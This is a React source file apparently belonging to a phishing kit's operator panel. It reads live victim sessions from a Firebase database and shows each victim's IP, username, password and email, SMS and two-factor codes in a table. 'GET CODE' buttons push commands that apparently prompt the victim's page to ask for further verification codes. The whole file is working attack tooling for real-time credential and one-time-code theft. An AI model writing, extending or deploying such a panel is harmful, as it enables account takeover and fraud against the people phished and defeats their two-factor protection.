"use client";

import { database } from "@/firebase";
import { onValue, ref, update } from "firebase/database";
import { useEffect, useRef, useState } from "react";

interface IInfo {
  [key: string]: {
    online: true;
    username: string;
    password: string;
    emailCode: string;
    twoAF: string;
    smsCode: string;
    trPass: {
      tr: string;
      email: string;
      sms: string;
      twoFa: string;
    };
    ip: string;
    zone: string;
    command: string;
  };
}

export default function PanelPage() {
  const [dataInfos, setDataInfos] = useState<IInfo>({});

  const [dataInfoString, setDtInfo] = useState("");

  const prevCountRef = useRef<IInfo>({});
  useEffect(() => {
    const infosRef = ref(database, "info");
    onValue(infosRef, (snap) => {
      const dataSet: IInfo = {};
      const data = snap.val();
      if (data) {
        const ips = Object.keys(data);
        ips.forEach((key) => {
          if (data[key]) {
            Object.keys(data[key]).forEach((c) => {
              const valueRow = data[key][c];
              if (valueRow.online) {
                dataSet[c] = valueRow;
              }
            });
          }
        });
        prevCountRef.current = dataSet;
        setDtInfo(JSON.stringify(dataSet));
      }
    });

    // setAudio(new Audio("/ring.wav"));
  }, []);

  useEffect(() => {
    if (
      Object.keys(dataInfos).length < Object.keys(prevCountRef.current).length
    ) {
      // audio.play();
    }

    if (dataInfos !== prevCountRef.current) {
      setDataInfos((prev) => {
        return { ...prevCountRef.current };
      });
    }
  }, [dataInfoString]);

  // const handleLoginError = (id: string) => {
  //   const infoRef = ref(database, `info/${id}`);
  //   update(infoRef, { command: "LOGIN_ERROR" });
  // };

  const handleCommand = (cmd: string, ip: string, id: string) => {
    const infoRef = ref(database, `info/${ip}/${id}`);
    update(infoRef, { command: cmd });
  };

  return (
    <>
      <main className="flex flex-col w-full h-[100vh] py-16 bg-zinc-800 text-zinc-200">
        <div className="flex flex-row w-full pb-24 px-10">
          <div className="flex w-full rounded-xl">
            <table className="w-full text-sm text-left rtl:text-right text-gray-500 rounded-2xl shadow">
              <thead className="text-xs text-white uppercase bg-zinc-600 rounded-2xl">
                <tr className="rounded-3xl">
                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    #
                  </th>
                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    Username
                  </th>
                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    Password
                  </th>
                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    EmailCode
                  </th>

                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    2AF
                  </th>

                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    SmsCode
                  </th>

                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-bold text-zinc-200 text-center"
                  >
                    STATUS
                  </th>
                </tr>
              </thead>
              <tbody className="rounded-3xl">
                {Object.keys(dataInfos).map((key, idx) => {
                  const data = dataInfos[key];
                  const id = key;
                  const ip = data.ip.replaceAll(".", ",");
                  return (
                    <tr key={key} className="bg-zinc-500">
                      <td className="px-6 py-4 font-medium text-base text-white text-center flex flex-row gap-2">
                        {data.ip}
                      </td>
                      <td className="px-6 py-4 font-medium text-base text-white text-center text-wrap">
                        {data.username !== "" ? (
                          <SpanValueText text={data.username} />
                        ) : (
                          "N/A"
                        )}
                      </td>
                      <td className="px-6 py-4 font-medium text-base text-white text-center">
                        {data.password !== "" ? (
                          <SpanValueText text={data.password} />
                        ) : (
                          "N/A"
                        )}
                      </td>
                      <td className="px-6 py-4 font-medium text-base text-white text-center">
                        {data.emailCode !== "" ? (
                          <SpanValueText text={data.emailCode} />
                        ) : data.command.includes("CONFIRM") ? (
                          <div className="flex w-full justify-center  items-center">
                            <button
                              onClick={() => handleCommand("W_SEC_2", ip, id)}
                              className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                            >
                              GET CODE
                            </button>
                          </div>
                        ) : (
                          "N/A"
                        )}
                      </td>

                      <td className="px-6 py-4 font-medium text-base text-white text-center items-center">
                        {data.twoAF !== "" ? (
                          <SpanValueText text={data.twoAF} />
                        ) : data.command.includes("CONFIRM") ? (
                          <div className="flex w-full justify-center  items-center">
                            <button
                              onClick={() => handleCommand("W_SEC_1", ip, id)}
                              className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                            >
                              GET CODE
                            </button>
                          </div>
                        ) : (
                          "N/A"
                        )}
                      </td>

                      <td className="px-6 py-4 font-medium text-base text-white text-center">
                        {data.smsCode !== "" ? (
                          <SpanValueText text={data.smsCode} />
                        ) : data.command.includes("CONFIRM") ? (
                          <div className="flex w-full justify-center  items-center">
                            <button
                              onClick={() => handleCommand("W_SEC_3", ip, id)}
                              className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                            >
                              GET CODE
                            </button>
                          </div>
                        ) : (
                          "N/A"
                        )}
                      </td>
                      <td className="px-6 py-4 font-medium text-base text-white text-center">
                        {data.command}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </div>
      </main>
    </>
  );
}

const SpanValueText = ({ text }: any) => {
  return (
    <>
      <span
        onClick={() => {
          navigator.clipboard.writeText(text);
        }}
        className="text-base font-bold text-zinc-300 cursor-pointer"
      >
        {text}
      </span>
    </>
  );
};
